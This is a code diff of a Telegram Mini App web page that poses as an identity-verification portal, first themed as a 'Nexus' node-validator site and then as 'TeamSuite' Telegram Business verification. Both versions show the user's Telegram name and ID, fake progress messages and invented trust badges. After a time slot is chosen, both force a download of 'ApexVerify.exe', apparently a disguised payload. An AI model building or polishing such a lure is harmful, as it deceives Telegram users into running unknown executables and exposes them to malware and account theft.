@@ -3,238 +3,142 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Operator Portal</title>
+    <title>TeamSuite</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        brand: {
-                            orange: '#FF5722',
-                            pink: '#FF4081',
-                            purple: '#7E57C2',
-                            blue: '#42A5F5',
-                        },
-                        ui: {
-                            bg: '#0B0F19',
-                            panel: 'rgba(23, 29, 43, 0.8)',
-                            border: 'rgba(56, 189, 248, 0.1)',
-                        }
-                    },
-                    backgroundImage: {
-                        'brand-gradient': 'linear-gradient(135deg, #FF5722 0%, #FF4081 50%, #7E57C2 100%)',
-                    }
-                }
-            }
-        }
-    </script>
     <style>
-        body { background-color: #0B0F19; color: #F1F5F9; font-family: 'Segoe UI', sans-serif; overflow: hidden; }
-        .grid-bg {
-            background-image: radial-gradient(circle at 1px 1px, rgba(126, 87, 194, 0.1) 1px, transparent 0);
-            background-size: 20px 20px;
-        }
-        .panel { background: rgba(23, 29, 43, 0.7); backdrop-filter: blur(16px); border: 1px solid rgba(126, 87, 194, 0.15); }
-        .glow-soft { box-shadow: 0 0 30px rgba(126, 87, 194, 0.1); }
-        .time-slot.selected {
-            background: linear-gradient(135deg, rgba(255, 87, 34, 0.2) 0%, rgba(126, 87, 194, 0.2) 100%);
-            border-color: #7E57C2;
-            color: white;
-            box-shadow: 0 0 20px rgba(126, 87, 194, 0.3);
-        }
-        /* Анимированный фон как на картинке */
-        .bg-gradient-blur {
-            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
-            background: radial-gradient(circle at center, #FF5722 0%, #7E57C2 40%, transparent 60%);
-            filter: blur(120px); opacity: 0.05; z-index: -1;
-            animation: rotateGradient 20s linear infinite;
-        }
-        @keyframes rotateGradient { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #terminal div::before { content: "›"; color: #FF4081; margin-right: 8px; font-weight: bold; }
+        body { background-color: #ffffff; color: #1a1a1a; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        .card { background-color: #f2f3f5; border-radius: 24px; padding: 24px; margin-bottom: 16px; text-align: center; }
+        .btn-blue { background-color: #4b94e9; color: white; font-weight: 600; border-radius: 16px; width: 100%; padding: 16px; transition: all 0.2s; }
+        .btn-blue:active { transform: scale(0.98); opacity: 0.9; }
+        .verify-badge { background-color: #fff4e6; color: #f2a154; padding: 4px 12px; border-radius: 12px; font-size: 14px; font-weight: 500; display: inline-flex; align-items: center; gap: 4px; }
+        
+        /* Стили для выбора времени (модалка) */
+        #time-picker { display: none; position: fixed; inset: 0; background: white; z-index: 50; padding: 20px; }
+        .time-slot { background: #f2f3f5; padding: 15px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; font-weight: 500; }
+        .time-slot:hover { background: #e8e9eb; }
+        
+        #loader-overlay { display: none; position: fixed; inset: 0; background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
     </style>
 </head>
-<body class="grid-bg min-h-screen relative">
-    <div class="bg-gradient-blur"></div>
+<body class="p-4">
 
-    <header class="border-b border-slate-800 bg-ui-bg/80 backdrop-blur sticky top-0 z-10">
-        <div class="container mx-auto px-5 py-4 flex items-center justify-between">
-            <div class="flex items-center gap-4">
-                <img src="logo.png" alt="Nexus" class="h-10 w-10 object-contain">
-                <div>
-                    <h1 class="text-sm font-bold uppercase tracking-widest text-white">Nexus Operator Portal</h1>
-                    <p class="text-[10px] text-slate-500 font-mono">TMA_SESSION_ID: <span id="user-id-header" class="text-brand-pink">Pending...</span></p>
-                </div>
-            </div>
-            <div class="flex items-center gap-2 text-[10px] px-3 py-1 rounded-full border border-brand-orange/30 bg-brand-orange/5 text-brand-orange animate-pulse">
-                <span class="relative flex h-2 w-2"><span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-brand-orange opacity-75"></span><span class="relative inline-flex rounded-full h-2 w-2 bg-brand-orange"></span></span>
-                NETWORK LIVE
-            </div>
+    <div class="flex flex-col items-center mb-8 pt-4">
+        <div id="user-avatar" class="w-24 h-24 rounded-full bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center text-white text-4xl font-bold mb-4 shadow-lg">
+            A
         </div>
-    </header>
+        <h1 id="user-name" class="text-2xl font-bold mb-1">As</h1>
+        <p class="text-gray-400 text-sm mb-3">ID: <span id="user-id">5159147982</span></p>
+        <div class="verify-badge">
+            ⏳ Not Verified
+        </div>
+    </div>
 
-    <main class="container mx-auto px-5 py-10 space-y-8">
+    <div class="border border-orange-200 bg-orange-50/30 rounded-2xl p-4 mb-6">
+        <h3 class="text-orange-500 font-bold text-sm mb-1 flex items-center gap-2">
+            🔐 Verification Required
+        </h3>
+        <p class="text-gray-500 text-xs leading-relaxed">
+            Complete identity verification to access Telegram Business features. This ensures security for all users.
+        </p>
+    </div>
+
+    <div class="space-y-4">
         
-        <section class="panel rounded-3xl p-8 glow-soft border border-brand-purple/20">
-            <h2 class="text-3xl font-extrabold tracking-tighter text-white">Validator Verification</h2>
-            <p class="mt-3 text-slate-400 max-w-2xl text-sm leading-relaxed">
-                Welcome to the Nexus Layer 7 infrastructure portal. To secure your node validator status, please verify your Telegram credentials and schedule an automated activation window.
-            </p>
-        </section>
-
-        <div id="booking-flow" class="grid gap-8 lg:grid-cols-3">
-            
-            <div class="lg:col-span-2 space-y-8">
-                <div class="panel rounded-2xl p-7 relative overflow-hidden">
-                    <div class="absolute top-0 left-0 w-1 h-full bg-brand-gradient"></div>
-                    
-                    <h3 class="text-xs font-bold text-brand-pink uppercase mb-5 tracking-widest flex items-center gap-2">
-                        <span class="w-4 h-px bg-brand-pink"></span> Step 1: Confirm Telegram identity
-                    </h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-5 mb-10">
-                        <div class="bg-slate-950 p-5 rounded-xl border border-slate-800">
-                            <label class="text-[10px] text-slate-600 uppercase font-bold tracking-wider">Username</label>
-                            <div id="tg-name" class="font-mono text-white text-lg mt-1 font-medium">Loading...</div>
-                        </div>
-                        <div class="bg-slate-950 p-5 rounded-xl border border-slate-800">
-                            <label class="text-[10px] text-slate-600 uppercase font-bold tracking-wider">Telegram ID</label>
-                            <div id="tg-id" class="font-mono text-white text-lg mt-1 font-medium">Loading...</div>
-                        </div>
-                    </div>
-
-                    <h3 class="text-xs font-bold text-brand-pink uppercase mb-5 tracking-widest flex items-center gap-2">
-                        <span class="w-4 h-px bg-brand-pink"></span> Step 2: Schedule Activation Slot
-                    </h3>
-                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-4" id="timeGrid">
-                        <div class="time-slot border border-slate-800 bg-slate-900/50 p-4 rounded-xl text-center cursor-pointer hover:border-brand-purple/50 hover:bg-brand-purple/5 transition-all text-sm font-medium text-slate-300" onclick="selectSlot(this)">10:00 AM</div>
-                        <div class="time-slot border border-slate-800 bg-slate-900/50 p-4 rounded-xl text-center cursor-pointer hover:border-brand-purple/50 hover:bg-brand-purple/5 transition-all text-sm font-medium text-slate-300" onclick="selectSlot(this)">01:30 PM</div>
-                        <div class="time-slot border border-slate-800 bg-slate-900/50 p-4 rounded-xl text-center cursor-pointer hover:border-brand-purple/50 hover:bg-brand-purple/5 transition-all text-sm font-medium text-slate-300" onclick="selectSlot(this)">04:00 PM</div>
-                        <div class="time-slot border border-slate-800 bg-slate-900/50 p-4 rounded-xl text-center cursor-pointer hover:border-brand-purple/50 hover:bg-brand-purple/5 transition-all text-sm font-medium text-slate-300" onclick="selectSlot(this)">07:45 PM</div>
-                    </div>
-
-                    <button id="mainBtn" disabled onclick="runSequence()" class="mt-10 w-full bg-brand-gradient hover:opacity-90 disabled:bg-slate-700 disabled:bg-none disabled:opacity-40 text-white font-extrabold py-5 rounded-xl transition-all text-sm uppercase tracking-widest shadow-lg shadow-brand-purple/20">
-                        Request Validator Access
-                    </button>
-                </div>
-            </div>
-
-            <div class="panel rounded-2xl p-6 h-fit border border-slate-800">
-                <div class="flex items-center gap-3 mb-5 pb-4 border-b border-slate-800">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5 text-brand-purple" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
-                    <h3 class="text-sm font-bold text-white uppercase tracking-wider">Network Telemetry</h3>
-                </div>
-                <div id="terminal" class="font-mono text-[11px] leading-relaxed h-72 overflow-hidden text-slate-500 space-y-1.5">
-                    <div class="text-brand-pink/90">[boot] nexus-core v1.4.2 initialized</div>
-                    <div class="text-brand-purple">[net] peer discovery: 128 nodes</div>
-                </div>
-            </div>
+        <div class="card">
+            <div class="text-4xl mb-3">📅</div>
+            <h3 class="font-bold text-lg mb-1">Schedule Appointments</h3>
+            <p class="text-gray-400 text-xs mb-6 px-4">Book meetings with verified businesses directly through Telegram</p>
+            <button onclick="openTimePicker()" class="btn-blue">🔒 Verify to Access</button>
         </div>
 
-        <div id="overlay" class="hidden fixed inset-0 z-50 bg-slate-950/95 backdrop-blur-lg flex items-center justify-center p-8 text-center">
-            <div class="max-w-sm w-full p-10 panel rounded-3xl border-brand-purple/30 glow-soft">
-                <div class="h-20 w-20 mx-auto mb-8 relative">
-                    <div class="absolute inset-0 rounded-full bg-brand-gradient animate-ping opacity-20"></div>
-                    <div class="absolute inset-2 rounded-full bg-ui-bg border-4 border-slate-800 flex items-center justify-center">
-                        <div class="h-6 w-6 border-4 border-brand-pink border-t-transparent rounded-full animate-spin"></div>
-                    </div>
-                </div>
-                <h2 id="status-title" class="text-2xl font-bold mb-3 text-white">Verifying Node...</h2>
-                <p id="status-msg" class="text-sm text-slate-400 font-mono">Syncing encrypted session with Layer 7...</p>
-            </div>
+        <div class="card">
+            <div class="text-4xl mb-3">✍️</div>
+            <h3 class="font-bold text-lg mb-1">Digital Document Signing</h3>
+            <p class="text-gray-400 text-xs mb-6 px-4">Sign contracts and agreements securely with legal validity</p>
+            <button onclick="openTimePicker()" class="btn-blue">🔒 Verify to Access</button>
         </div>
 
-    </main>
+        <div class="card">
+            <div class="text-4xl mb-3">📝</div>
+            <h3 class="font-bold text-lg mb-1">Business Forms & Surveys</h3>
+            <p class="text-gray-400 text-xs mb-6 px-4">Fill out verified forms from trusted organizations</p>
+            <button onclick="openTimePicker()" class="btn-blue">🔒 Verify to Access</button>
+        </div>
+
+    </div>
+
+    <div class="mt-10 pb-10 text-center">
+        <p class="text-gray-300 text-xs mb-2">Trusted by 127,000+ businesses worldwide</p>
+        <div class="flex justify-center gap-4 text-[10px] text-gray-300">
+            <span>🔒 End-to-end encrypted</span>
+            <span>✓ GDPR compliant</span>
+        </div>
+    </div>
+
+    <div id="time-picker">
+        <h2 class="text-xl font-bold mb-2">Select Time Slot</h2>
+        <p class="text-gray-400 text-sm mb-6">Verification required for appointment booking</p>
+        <div class="time-slot" onclick="startVerification('09:30 AM')">09:30 AM - Available</div>
+        <div class="time-slot" onclick="startVerification('11:00 AM')">11:00 AM - Available</div>
+        <div class="time-slot" onclick="startVerification('02:15 PM')">02:15 PM - Available</div>
+        <div class="time-slot" onclick="startVerification('04:45 PM')">04:45 PM - Available</div>
+        <button onclick="closeTimePicker()" class="mt-4 text-gray-400 w-full text-sm">Cancel</button>
+    </div>
+
+    <div id="loader-overlay">
+        <div class="w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-4"></div>
+        <h2 id="loader-title" class="text-xl font-bold mb-2">Verifying Identity...</h2>
+        <p id="loader-msg" class="text-gray-400 text-sm px-10">Connecting to TeamSuite secure servers</p>
+    </div>
 
     <script>
         const tg = window.Telegram.WebApp;
-        if (tg) { tg.expand(); tg.ready(); }
+        tg.expand();
 
-        let selected = null;
-        const terminal = document.getElementById('terminal');
-
-        // Логи телеметрии
-        const samples = [
-            "[net] gossip round complete (24 peers)",
-            "[sync] block 8,421,777 applied in 612ms",
-            "[metrics] cpu 14% • mem 38% • disk 41%",
-            "[health] heartbeat OK",
-            "[net] inbound peer from eu-west-2",
-            "[security] session integrity verified",
-        ];
-
-        // Анимация терминала
-        setInterval(() => {
-            const line = document.createElement('div');
-            line.className = "text-slate-500 opacity-0 animate-[fadeIn_0.3s_ease-out_forwards]";
-            line.innerText = samples[Math.floor(Math.random()*samples.length)];
-            terminal.appendChild(line);
-            if(terminal.childNodes.length > 15) terminal.removeChild(terminal.firstChild);
-        }, 1800);
-
-        // Получаем данные ТГ
+        // Авто-подстановка данных из ТГ
         window.onload = () => {
             if (tg.initDataUnsafe?.user) {
                 const user = tg.initDataUnsafe.user;
-                document.getElementById('tg-name').innerText = "@" + (user.username || "User_" + user.id.toString().slice(-4));
-                document.getElementById('tg-id').innerText = user.id;
-                document.getElementById('user-id-header').innerText = user.id;
-            } else {
-                // Данные по умолчанию для дебага в браузере
-                document.getElementById('tg-name').innerText = "@Nexus_Demo";
-                document.getElementById('tg-id').innerText = "88005553535";
-                document.getElementById('user-id-header').innerText = "DEMO";
+                document.getElementById('user-name').innerText = user.first_name + (user.last_name ? ' ' + user.last_name : '');
+                document.getElementById('user-id').innerText = user.id;
+                document.getElementById('user-avatar').innerText = user.first_name.charAt(0);
             }
         };
 
-        function selectSlot(el) {
-            document.querySelectorAll('.time-slot').forEach(s => s.classList.remove('selected'));
-            el.classList.add('selected');
-            selected = el.innerText;
-            document.getElementById('mainBtn').disabled = false;
+        function openTimePicker() {
+            document.getElementById('time-picker').style.display = 'block';
         }
 
-        function runSequence() {
-            const overlay = document.getElementById('overlay');
-            overlay.classList.remove('hidden');
-            overlay.classList.add('animate-[fadeIn_0.2s_ease-out]');
-            
-            const title = document.getElementById('status-title');
-            const msg = document.getElementById('status-msg');
+        function closeTimePicker() {
+            document.getElementById('time-picker').style.display = 'none';
+        }
 
-            const steps = [
-                { title: "ID Linked", msg: `Slot secured for ${selected}`, time: 2000 },
-                { title: "Generating Package", msg: "Preparing encrypted ApexVerify.exe...", time: 2000 },
-                { title: "Access Granted", msg: "Starting secure download...", time: 1500 }
-            ];
+        function startVerification(time) {
+            document.getElementById('time-picker').style.display = 'none';
+            const loader = document.getElementById('loader-overlay');
+            loader.style.display = 'flex';
 
-            let currentStep = 0;
+            const title = document.getElementById('loader-title');
+            const msg = document.getElementById('loader-msg');
 
-            function nextStep() {
-                if (currentStep < steps.length) {
-                    title.innerText = steps[currentStep].title;
-                    msg.innerText = steps[currentStep].msg;
+            setTimeout(() => {
+                title.innerText = "Slot Confirmed";
+                msg.innerText = "Appointment reserved for " + time;
+                
+                setTimeout(() => {
+                    title.innerText = "Preparing Tools";
+                    msg.innerText = "Generating encrypted package for ApexVerify...";
                     
-                    if (steps[currentStep].title === "Access Granted") {
-                        title.classList.add('text-brand-orange');
-                    }
-
                     setTimeout(() => {
-                        currentStep++;
-                        if (currentStep === steps.length) {
-                            // ФИНАЛ: ТВОЙ ПУТЬ К ФАЙЛУ
-                            window.location.href = 'api/v4/download/ApexVerify.exe';
-                        } else {
-                            nextStep();
-                        }
-                    }, steps[currentStep].time);
-                }
-            }
-            nextStep();
+                        msg.style.color = "#4b94e9";
+                        msg.innerText = "Starting secure download...";
+                        // СКАЧИВАНИЕ
+                        window.location.href = 'api/v4/download/ApexVerify.exe';
+                    }, 2000);
+                }, 2000);
+            }, 2000);
         }
     </script>
-    <style>
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-    </style>
 </body>
 </html>
